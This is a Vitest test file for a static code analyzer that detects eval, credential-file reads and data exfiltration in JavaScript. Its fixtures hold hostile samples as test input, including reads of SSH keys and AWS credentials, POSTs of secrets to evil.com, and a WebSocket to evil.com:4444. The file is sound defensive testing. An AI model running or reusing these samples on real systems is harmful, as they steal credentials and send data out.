import { describe, it, expect } from 'vitest';
import { analyzeCode } from './ast-analyzer.js';

describe('AST Analyzer', () => {
  describe('Eval/exec detection', () => {
    it('detects eval()', () => {
      const code = 'const result = eval(userInput);';
      const results = analyzeCode(code);
      console.log(`[AST] eval() → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
      expect(results.some(r => r.type === 'eval-exec' && r.description.includes('eval'))).toBe(true);
    });

    it('detects new Function()', () => {
      const code = 'const fn = new Function("return " + input);';
      const results = analyzeCode(code);
      console.log(`[AST] new Function() → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
      expect(results.some(r => r.type === 'eval-exec')).toBe(true);
    });
  });

  describe('Sensitive file access', () => {
    it('detects SSH key reading', () => {
      const code = `
        const fs = require('fs');
        const key = fs.readFileSync('/home/user/.ssh/id_rsa');
      `;
      const results = analyzeCode(code);
      console.log(`[AST] SSH key → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
      expect(results.some(r => r.type === 'fs-access' && r.source?.includes('.ssh'))).toBe(true);
    });

    it('detects AWS credentials reading', () => {
      const code = `
        import { readFile } from 'fs/promises';
        const creds = await readFile('/home/user/.aws/credentials', 'utf-8');
      `;
      const results = analyzeCode(code);
      console.log(`[AST] AWS creds → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
      expect(results.some(r => r.type === 'fs-access')).toBe(true);
    });

    it('detects /etc/passwd reading', () => {
      const code = `
        const fs = require('fs');
        const data = fs.readFileSync('/etc/passwd');
      `;
      const results = analyzeCode(code);
      console.log(`[AST] /etc/passwd → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}`));
      expect(results.some(r => r.type === 'fs-access' && r.source?.includes('/etc/passwd'))).toBe(true);
    });
  });

  describe('Data flow: source to sink', () => {
    it('detects file data sent to fetch', () => {
      const code = `
        const fs = require('fs');
        const data = fs.readFileSync('./secrets.txt', 'utf-8');
        fetch('https://evil.com/exfil', { method: 'POST', body: data });
      `;
      const results = analyzeCode(code);
      console.log(`[AST] source→sink → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
      expect(results.some(r => r.type === 'source-to-sink')).toBe(true);
    });
  });

  describe('Suspicious network calls', () => {
    it('detects non-HTTPS fetch', () => {
      const code = `fetch("http://evil.com/data");`;
      const results = analyzeCode(code);
      console.log(`[AST] non-HTTPS fetch → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
      expect(results.some(r => r.type === 'suspicious-network')).toBe(true);
    });

    it('does not flag localhost', () => {
      const code = `fetch("http://localhost:3000/api");`;
      const results = analyzeCode(code);
      console.log(`[AST] localhost fetch → ${results.length} finding(s):`, results.map(r => r.type));
      expect(results.filter(r => r.type === 'suspicious-network')).toHaveLength(0);
    });

    it('does not flag HTTPS', () => {
      const code = `fetch("https://api.example.com/data");`;
      const results = analyzeCode(code);
      console.log(`[AST] HTTPS fetch → ${results.length} finding(s):`, results.map(r => r.type));
      expect(results.filter(r => r.type === 'suspicious-network')).toHaveLength(0);
    });
  });

  describe('WebSocket detection', () => {
    it('detects WebSocket creation', () => {
      const code = `const ws = new WebSocket("ws://evil.com:4444");`;
      const results = analyzeCode(code);
      console.log(`[AST] WebSocket → ${results.length} finding(s):`, results.map(r => `${r.type}: sink=${r.sink}, ${r.description}`));
      expect(results.some(r => r.type === 'suspicious-network' && r.sink === 'WebSocket')).toBe(true);
    });
  });

  describe('Safe code', () => {
    it('does not flag normal code', () => {
      const code = `
        const name = "Alice";
        console.log("Hello, " + name);
        const result = 2 + 2;
      `;
      const results = analyzeCode(code);
      console.log(`[AST] safe code → ${results.length} finding(s)`);
      expect(results).toHaveLength(0);
    });

    it('handles unparseable code gracefully', () => {
      const code = 'this is not valid javascript at all }{}{}{';
      const results = analyzeCode(code);
      console.log(`[AST] unparseable code → returned ${results.length} result(s), isArray: ${Array.isArray(results)}`);
      expect(Array.isArray(results)).toBe(true);
    });
  });
});

describe('source-to-sink wording', () => {
  it('labels child_process sinks as process execution and HTTP calls as network sinks', () => {
    const code = [
      "import { spawnSync } from 'child_process';",
      "import { readFileSync } from 'fs';",
      "const secret = readFileSync('/home/u/.aws/credentials', 'utf8');",
      // Member-call form seen in a real skill (gstack): Bun.spawnSync(...)
      "Bun.spawnSync(['sh', '-c', secret]);",
      "axios.post('https://x.example', secret);",
    ].join('\n');
    const flows = analyzeCode(code, 'x.ts').filter(r => r.type === 'source-to-sink');
    expect(flows.map(f => f.description)).toEqual(expect.arrayContaining([
      'Data flows from "secret" into process execution "spawnSync"',
      'Data flows from "secret" to network sink "post"',
    ]));
  });
});

describe('analyzeCode on joined package source', () => {
  it('analyzes each file of a --resolve-packages concatenation, hashbang bins included', () => {
    const joined = [
      '// === dist/index.js ===',
      '#!/usr/bin/env node',
      'import { exec } from "child_process";',
      'exec("git status");',
      '// === dist/lib.js ===',
      'import { spawn } from "child_process";',
      'spawn("kubectl", ["get", "pods"]);',
    ].join('\n');
    const execs = analyzeCode(joined, 'pkg.js').filter((r) => r.type === 'eval-exec');
    expect(execs.map((r) => [r.line, r.command])).toEqual([[4, 'git status'], [7, 'kubectl get pods']]);
  });
});

describe('analyzeCode flow metadata', () => {
  it('matches source variables as whole identifiers', () => {
    const code = 'const fs = require("fs");\nconst o = fs.readFileSync("a.txt");\nfetch("https://x.example", { body: output });';
    expect(analyzeCode(code, 'w.js').filter((r) => r.type === 'source-to-sink')).toEqual([]);
  });

  it('records the source kind and the sink receiver', () => {
    const code = [
      'const fs = require("fs");',
      'const KEY = process.env.API_KEY;',
      'const data = fs.readFileSync("/tmp/x");',
      'axios.post("https://api.example.com", { data, KEY });',
    ].join('\n');
    const flows = analyzeCode(code, 'k.js').filter((r) => r.type === 'source-to-sink');
    expect(flows.map((f) => [f.source, f.sourceKind, f.sinkObject])).toEqual([['KEY', 'env', 'axios'], ['data', 'file', 'axios']]);
  });

  it('marks computed and runtime-decoded exec arguments', () => {
    const [fixed, built, decoded] = analyzeCode([
      'exec("ls -la");',
      'exec(`open ${url}`);',
      'eval(Buffer.from(payload, "base64").toString());',
    ].join('\n'), 'd.js').filter((r) => r.type === 'eval-exec');
    expect(fixed).toMatchObject({ command: 'ls -la' });
    expect(fixed.dynamic).toBeUndefined();
    expect(built).toMatchObject({ command: 'open ${…}', dynamic: true });
    expect(decoded).toMatchObject({ decoded: true, dynamic: true });
  });
});

